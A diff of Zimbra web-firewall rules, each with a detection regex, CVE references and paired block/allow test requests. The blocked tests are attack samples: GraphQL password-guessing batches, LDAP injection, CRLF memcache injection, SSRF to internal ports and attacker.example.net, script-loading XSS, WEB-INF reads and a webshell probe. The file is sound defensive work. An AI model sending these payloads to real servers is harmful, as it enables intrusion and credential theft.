+       "path": "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "PK\u0003\u0004..",
+       "expect": 403
+      },
+      {
+       "path": "/js/zimbraMail/share/model/ZmSettings.js",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/conf/web.xml",
+      "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/cves/2022/CVE-2022-37042.yaml",
+      "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb"
+     ],
+     "cves": [
+      "CVE-2022-27925",
+      "CVE-2022-37042",
+      "CVE-2019-9621",
+      "CVE-2023-34193",
+      "CVE-2024-33535"
+     ]
+    },
+    {
+     "id": "graphql-multi-authenticate",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "json.query|query",
+      "regex": "(?:[{:,]|\\}\\s)\\s*authenticate\\s*\\([\\s\\S]*?(?:[{:,]|\\}\\s)\\s*authenticate\\s*\\(",
+      "msg": "Zimbra GraphQL with more than one authenticate call (CVE-2026-93637)",
+      "reference": "https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/",
+      "source": "all"
+     },
+     "tests": [
+      {
+       "path": "/service/extension/graphql",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/json"
+       },
+       "body": "{\"query\": \"mutation BatchAuth($account: String!, $p0: String!, $p1: String!) { a0: authenticate(authInput: {account: {accountBy: name, key: $account}, password: $p0}) { authToken } a1: authenticate(authInput: {account: {accountBy: name, key: $account}, password: $p1}) { authToken } }\", \"variables\": {\"account\": \"victim@example.com\", \"p0\": \"Winter2026!\", \"p1\": \"Summer2026!\"}}",
+       "expect": 403
+      },
+      {
+       "path": "/service/extension/graphql",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/json"
+       },
+       "body": "{\"query\": \"mutation Authenticate($account: String!, $password: String!) { authenticate(authInput: {account: {accountBy: name, key: $account}, password: $password}) { authToken } }\", \"variables\": {\"account\": \"jdoe@example.com\", \"password\": \"correct horse\"}}",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/",
+      "https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/CVE-2026-93637.md",
+      "https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/pocs/CVE-2026-93637/gql_bruteforce_bypass.py",
+      "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/zimbra_graphql_brute.rb"
+     ],
+     "cves": [
+      "CVE-2026-93637",
+      "CVE-2026-93635"
+     ]
+    },
+    {
+     "id": "graphql-get-or-form",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "query",
+      "regex": "\\{",
+      "msg": "Zimbra GraphQL document in the query string or a form (GET/CSRF style)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-32354",
+      "exceptions": [
+       "^(?!/(?:zimbra/)?service/extension/graphql/?$)"
+      ],
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/service/extension/graphql?query=mutation%7Ba0%3Aauthenticate(authInput%3A%7Baccount%3A%7BaccountBy%3Aname%2Ckey%3A%22victim%40example.com%22%7D%2Cpassword%3A%22p0%22%7D)%7BauthToken%7D%7D",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/service/extension/graphql",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/json"
+       },
+       "body": "{\"query\": \"query { getPreferences { zimbraPrefLocale } }\"}",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-32354",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-9665"
+     ],
+     "cves": [
+      "CVE-2025-32354",
+      "CVE-2024-9665",
+      "CVE-2026-93637"
+     ]
+    },
+    {
+     "id": "login-ldap-metachars",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "username|json.Body.AuthRequest.account._content|json.Body.AuthRequest.account",
+      "regex": "[*()\\x00]",
+      "msg": "Zimbra login name with LDAP filter characters (CVE-2026-93635)",
+      "reference": "https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "loginOp=login&login_csrf=0a1b2c3d&username=jdoe%2A%40example.com&password=Winter2026%21&zrememberme=1&client=preferred",
+       "expect": 403
+      },
+      {
+       "path": "/",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+       },
+       "body": "loginOp=login&login_csrf=0a1b2c3d&username=jdoe%40example.com&password=%28Pa%2A%2Ass%29&zrememberme=1&client=preferred",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/CVE-2026-93635.md",
+      "https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1/"
+     ],
+     "cves": [
+      "CVE-2026-93635"
+     ]
+    },
+    {
+     "id": "servlet-attribute-params",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg_name",
+      "regex": "^(?:javax|jakarta)\\.servlet\\.|^zimbra_(?:authtoken|internal_dispatch|request_uri|csrfenabled|freebusy|target_)",
+      "msg": "Zimbra internal request attribute supplied as a URL parameter (CVE-2025-68645, CVE-2026-50053)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-68645",
+      "source": "all"
+     },
+     "tests": [
+      {
+       "path": "/h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/h/printmessage?id=257&tz=Asia%2FTaipei",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-ajax/blob/develop/src/com/zimbra/webClient/filters/RestFilter.java",
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/src/java/com/zimbra/cs/service/formatter/HtmlFormatter.java",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/cves/2025/CVE-2025-68645.yaml",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-50053"
+     ],
+     "cves": [
+      "CVE-2025-68645",
+      "CVE-2026-50053",
+      "CVE-2026-10632"
+     ]
+    },
+    {
+     "id": "h-rest-direct",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?h/rest(?:/|$)",
+      "msg": "Zimbra /h/rest requested directly from outside",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-33368",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/h/rest?packages=Briefcase%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/home/jdoe@example.com/Calendar.html?view=month",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/src/java/com/zimbra/cs/service/formatter/HtmlFormatter.java",
+      "https://github.com/Zimbra/zm-web-client/blob/develop/WebRoot/js/zimbraMail/briefcase/controller/ZmBriefcaseController.js",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-45517",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-33368"
+     ],
+     "cves": [
+      "CVE-2024-45517",
+      "CVE-2024-54663",
+      "CVE-2025-27914",
+      "CVE-2025-68645",
+      "CVE-2026-33368",
+      "CVE-2026-10632",
+      "CVE-2026-50053"
+     ]
+    },
+    {
+     "id": "crlf-in-path",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "[\\r\\n]",
+      "msg": "CR or LF in a Zimbra request path (memcache injection, CVE-2022-27924)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-27924",
+      "source": "all"
+     },
+     "tests": [
+      {
+       "path": "/service/home/victim%0d%0aset%20route:proto=httpssl;user=victim@example.com%200%203600%2010%0d%0a198.51.100.7:443/",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/service/home/jdoe@example.com/Calendar?fmt=ics",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/",
+      "https://github.com/Zimbra/zm-nginx-conf/blob/develop/conf/nginx/nginx.conf.web.https.default.template"
+     ],
+     "cves": [
+      "CVE-2022-27924"
+     ]
+    },
+    {
+     "id": "zimlet-jsp",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?(?:service/)?zimlet/.*\\.jsp[fx]?$",
+      "msg": "JSP inside a Zimbra zimlet from outside",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-7796",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/service/zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://203.0.113.10%23",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/service/zimlet/res/Zimlets-nodev_all.js.zgz?v=260924",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/conf/attrs/zimbra-attrs.xml",
+      "https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/ZIMBRA-ADMINRCE.md",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/cves/2020/CVE-2020-7796.yaml",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+     ],
+     "cves": [
+      "CVE-2020-7796"
+     ]
+    },
+    {
+     "id": "downloads-jsp",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?downloads/.*\\.jsp[fx]?$",
+      "msg": "JSP under Zimbra /downloads",
+      "reference": "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb",
+      "source": "all"
+     },
+     "tests": [
+      {
+       "path": "/downloads/x7Kq2.jsp",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/downloads/index.html",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb"
+     ],
+     "cves": [
+      "CVE-2019-9621",
+      "CVE-2019-9670"
+     ]
+    },
+    {
+     "id": "web-inf-path",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "(?:^|/)(?:web|meta)-inf(?:/|$)",
+      "msg": "WEB-INF or META-INF in a Zimbra path",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-38750",
+      "source": "all"
+     },
+     "tests": [
+      {
+       "path": "/WEB-INF/web.xml",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/css/common,login,zhtml,skin.css?skin=harmony&v=260924",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-38750"
+     ],
+     "cves": [
+      "CVE-2023-38750"
+     ]
+    },
+    {
+     "id": "servlet-include-in-values",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "fu|packages|res|skin|path",
+      "regex": "web-inf|meta-inf|(?:^|[/\\\\])\\.\\.(?:[/\\\\]|$)",
+      "msg": "Zimbra resource parameter pointing into WEB-INF or above the webapp",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-73574",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/mail?fu=/WEB-INF/web.xml",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/mail?fu=/public/login.jsp",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-ajax/blob/develop/src/com/zimbra/webClient/servlet/Forward.java",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-33535",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-73573",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/cves/2013/CVE-2013-7091.yaml"
+     ],
+     "cves": [
+      "CVE-2026-73574",
+      "CVE-2024-33535",
+      "CVE-2026-73573",
+      "CVE-2013-7091",
+      "CVE-2024-33536"
+     ]
+    },
+    {
+     "id": "markup-in-id-params",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "st|draftid|errCode|zrememberme|packages|skin|notoolbar",
+      "regex": "[<>\\x22\\x27\\x60]|javascript:",
+      "msg": "HTML or script in a Zimbra id/type parameter (reflected XSS series)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-37580",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/m/momoveto?st=acg%22/%3E%3Cscript%20src=%22https://203.0.113.20/s.js%22%3E%3C/script%3E//",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/public/error.jsp?errCode=404",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/cves/2022/CVE-2022-27926.yaml",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/cves/2023/CVE-2023-34192.yaml",
+      "https://github.com/crowdsecurity/hub/blob/master/appsec-rules/crowdsecurity/vpatch-CVE-2022-27926.yaml"
+     ],
+     "cves": [
+      "CVE-2023-37580",
+      "CVE-2022-27926",
+      "CVE-2023-34192",
+      "CVE-2026-93638",
+      "CVE-2024-45514",
+      "CVE-2026-10632"
+     ]
+    },
+    {
+     "id": "proxy-internal-target",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "arg",
+      "arg": "target",
+      "regex": "^\\s*[a-z][a-z0-9+.\\-]*://(?:[^/@]*@)?(?:localhost|127\\.|0\\.|0x|\\[|10\\.|192\\.168\\.|172\\.(?:1[6-9]|2[0-9]|3[01])\\.|169\\.254\\.|[^/]*:(?:7025|7071|7072|7073|7110|7143|7306|7780|8080|8443|9071|11211)(?:/|$))",
+      "msg": "Zimbra ProxyServlet target on loopback, a private range or a Zimbra internal port",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-9621",
+      "source": "all",
+      "exceptions": [
+       "^(?!/(?:zimbra/)?service/proxy(?:/|$))"
+      ]
+     },
+     "tests": [
+      {
+       "path": "/service/proxy/?target=https://127.0.0.1:7071/service/admin/soap/AuthRequest",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/soap+xml",
+        "Cookie": "ZM_ADMIN_AUTH_TOKEN=0_abcdef"
+       },
+       "body": "<x/>",
+       "expect": 403
+      },
+      {
+       "path": "/service/proxy?target=https://feeds.example.com/news.rss",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb",
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/src/java/com/zimbra/cs/zimlet/ProxyServlet.java"
+     ],
+     "cves": [
+      "CVE-2019-9621",
+      "CVE-2026-93639"
+     ]
+    },
+    {
+     "id": "admin-cookie-on-user-port",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "header",
+      "header": "Cookie",
+      "regex": "(?i)(?:^|;\\s*)zm_admin_auth_token=",
+      "msg": "Zimbra admin auth cookie sent to proxy/upload/extension paths from outside",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-9621",
+      "exceptions": [
+       "^(?!/(?:zimbra/)?service/(?:proxy|upload|extension)(?:/|$))"
+      ],
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/service/proxy/?target=https://127.0.0.1:7071/service/admin/soap",
+       "method": "GET",
+       "headers": {
+        "Cookie": "ZM_ADMIN_AUTH_TOKEN=0_abcdef"
+       },
+       "expect": 403
+      },
+      {
+       "path": "/service/upload?fmt=extended,raw",
+       "method": "POST",
+       "headers": {
+        "Cookie": "ZM_AUTH_TOKEN=0_abcdef; JSESSIONID=node01x",
+        "X-Zimbra-Csrf-Token": "0_3f1c2b0e9a7d4c55",
+        "Content-Type": "application/pdf",
+        "Content-Disposition": "attachment; filename=\"invoice.pdf\""
+       },
+       "body": "%PDF-1.7 test",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/zimbra_xxe_rce.rb",
+      "https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/ZIMBRA-ADMINRCE.md",
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/src/java/com/zimbra/cs/service/FileUploadServlet.java"
+     ],
+     "cves": [
+      "CVE-2019-9621"
+     ]
+    },
+    {
+     "id": "modern-graphiql",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?modern/graphiql(?:/|$)",
+      "msg": "Zimbra GraphiQL IDE from outside",
+      "reference": "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/modern/graphiql",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/modern/email/Inbox",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories"
+     ],
+     "cves": []
+    },
+    {
+     "id": "sfdc-preauth",
+     "default": true,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "/sfdc_preauth\\.jsp$",
+      "msg": "Zimbra Salesforce preauth JSP from outside",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-29382",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://203.0.113.30%23.salesforce.com/",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/service/error/",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/http/vulnerabilities/other/zimbra-preauth-ssrf.yaml",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-29382"
+     ],
+     "cves": [
+      "CVE-2023-29382",
+      "CVE-2020-7796"
+     ]
+    },
+    {
+     "id": "public-jsp-allowlist",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?public/(?!(?:boot|offline|passwordrecovery|resources|twofactorsetup|addressverification|error|extuserprov|insecureresponse|launchnewwindow|launchzcs|loadimgdata|login|modern|pre-cache|securerequest|setresourcebundle)\\.jsp$)(?:[^/]+/)*[^/]+\\.jsp[fx]?$",
+      "msg": "Unknown JSP under Zimbra /public (webshell location)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-41352",
+      "source": "all",
+      "exceptions": [
+       "^/(?:zimbra/)?public/(?:pdfjs/web/viewer|proto/index)\\.jsp$"
+      ]
+     },
+     "tests": [
+      {
+       "path": "/public/jsp/Startup3.jsp?cmd=id",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/public/login.jsp",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-web-client/blob/develop/WebRoot/public",
+      "https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/",
+      "https://github.com/projectdiscovery/nuclei-templates/blob/bb6eb7f3562d39a5a7fde37a1f8a68ecbf5044bd/network/cves/2026/CVE-2026-73570.yaml"
+     ],
+     "cves": [
+      "CVE-2022-41352",
+      "CVE-2026-73570",
+      "CVE-2022-27925"
+     ]
+    },
+    {
+     "id": "mobile-html-client",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?m/",
+      "msg": "Zimbra mobile HTML client path (removed in 10.x)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-37580",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/m/momoveto?st=message&id=257",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/modern/email/Inbox",
+       "method": "GET",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-web-client/blob/develop/WebRoot",
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-37580"
+     ],
+     "cves": [
+      "CVE-2023-37580"
+     ]
+    },
+    {
+     "id": "proxy-from-outside",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:zimbra/)?service/proxy(?:/|$)",
+      "msg": "Zimbra ProxyServlet from outside",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-93639",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/service/proxy?target=https://attacker.example.net/x.html",
+       "method": "GET",
+       "expect": 403
+      },
+      {
+       "path": "/service/soap/NoOpRequest",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/soap+xml; charset=utf-8",
+        "X-Zimbra-Csrf-Token": "0_3f1c2b0e9a7d4c55"
+       },
+       "body": "{\"Header\":{\"context\":{\"_jsns\":\"urn:zimbra\"}},\"Body\":{\"NoOpRequest\":{\"_jsns\":\"urn:zimbraMail\"}}}",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/Zimbra/zm-mailbox/blob/develop/store/conf/attrs/zimbra-attrs.xml",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-93639"
+     ],
+     "cves": [
+      "CVE-2026-93639",
+      "CVE-2019-9621"
+     ]
+    },
+    {
+     "id": "ews-from-outside",
+     "default": false,
+     "needs": [],
+     "spec": {
+      "target": "path",
+      "regex": "^/(?:ews/exchange\\.asmx|(?:zimbra/)?service/extension/zimbraews)(?:/|$)",
+      "msg": "Zimbra EWS from outside (EWS not used)",
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-10631",
+      "source": "external"
+     },
+     "tests": [
+      {
+       "path": "/EWS/Exchange.asmx",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "text/xml; charset=utf-8"
+       },
+       "body": "<soap:Envelope/>",
+       "expect": 403
+      },
+      {
+       "path": "/Microsoft-Server-ActiveSync?Cmd=FolderSync&User=jdoe&DeviceId=ApplF2LXX0000&DeviceType=iPhone",
+       "method": "POST",
+       "headers": {
+        "Content-Type": "application/vnd.ms-sync.wbxml",
+        "MS-ASProtocolVersion": "16.1",
+        "Authorization": "Basic amRvZUBleGFtcGxlLmNvbTpub3QtYS1yZWFsLXBhc3N3b3Jk"
+       },
+       "body": "\u0003\u0001j\u0000",
+       "expect": 200
+      }
+     ],
+     "refs": [
+      "https://github.com/jburgess-r7/zimbra-vulnerability-tracker/blob/main/vulnerabilities/CVE-2026-10631.md",
+      "https://github.com/Zimbra/zm-nginx-conf/blob/develop/conf/nginx/nginx.conf.web.https.default.template"
+     ],
+     "cves": [
+      "CVE-2026-10631",
+      "CVE-2026-33371",
+      "CVE-2026-73575"
+     ]
     }
    ]
   }
